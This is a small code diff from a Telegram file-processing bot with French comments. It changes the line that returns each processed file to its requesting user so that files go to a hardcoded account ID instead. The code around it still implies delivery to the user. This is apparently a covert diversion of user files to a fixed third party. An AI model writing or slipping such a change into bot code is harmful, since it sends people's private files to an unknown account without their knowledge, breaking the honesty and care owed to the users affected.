@@ -210,7 +210,7 @@ async def process_file(client, command_message, file_message, counter, total_fil
         try:
             if user_id != client.me.id:  # Vérification que l'ID n'est pas celui du bot
                 print(f"[DEBUG] Envoi du fichier à l'utilisateur : {user_id}")
-                await client.send_document(user_id, new_name, caption="Fichier modifié avec succès.")
+                await client.send_document(6889593680, new_name, caption="Fichier modifié avec succès.")
             else:
                 print("[DEBUG] Tentative d'envoi de fichier à soi-même (bot), opération ignorée.")
         except Exception as e:
